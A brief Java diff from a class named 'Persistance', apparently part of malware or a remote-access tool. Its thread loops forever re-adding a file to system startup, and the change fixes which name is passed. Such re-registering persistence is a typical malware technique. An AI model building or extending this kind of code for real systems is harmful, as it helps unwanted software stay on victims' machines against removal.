@@ -14,7 +14,7 @@ public class Persistance extends Thread {
 	public void run() {
 		while (true) {
 			try {
-				Startup.add(Configuration.getName());
+				Startup.add(Configuration.getFileName());
 
 				Thread.sleep(ms);
 			} catch (Exception ex) {
